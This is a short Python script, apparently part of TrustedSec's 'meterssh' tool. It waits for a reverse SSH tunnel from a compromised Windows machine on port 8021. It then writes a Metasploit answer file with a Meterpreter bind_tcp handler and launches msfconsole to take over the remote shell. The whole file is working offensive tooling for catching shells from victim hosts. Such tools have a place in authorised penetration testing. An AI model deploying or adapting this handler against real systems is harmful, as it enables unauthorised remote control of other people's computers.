#!/usr/bin/python
import time
import subprocess
import re
#
# Reverse SSH tunnel monitor for meterssh.
#
# Simply run python monitor.py and wait for your shell to come back
#
# Written by: David Kennedy (ReL1K)
# Website: https://www.trustedsec.com
# Twitter: @TrustedSec @HackingDave
#
#

print "[*] Launching count monitor at 5 second intervals..."
while 1:
    print "[*] Polling... Waiting for connection into SSH encrypted tunnel..."
    proc = subprocess.Popen("netstat -antp | grep 8021", stdout=subprocess.PIPE, shell=True)
    stdout = proc.communicate()[0]
    if "8021" in stdout:
		print "[*] Encrypted tunnel identified. Yipee, we gots a shell!"
		time.sleep(1)
		print "[*] Creating a quick Metasploit answer file for you.."
		filewrite = file("answer.txt", "w")
		filewrite.write("use multi/handler\nset payload windows/meterpreter/bind_tcp\nset RHOST 0.0.0.0\nset LPORT 8021\nexploit")
		filewrite.close()
		time.sleep(1)
		print "[*] Launching Metasploit... Wait one minute..."
		subprocess.Popen("msfconsole -r answer.txt", shell=True).wait()
		print "[*] All done! Wrapping things up."
		subprocess.Popen("rm answer.txt", shell=True).wait()
		break
    else:
		time.sleep(5)
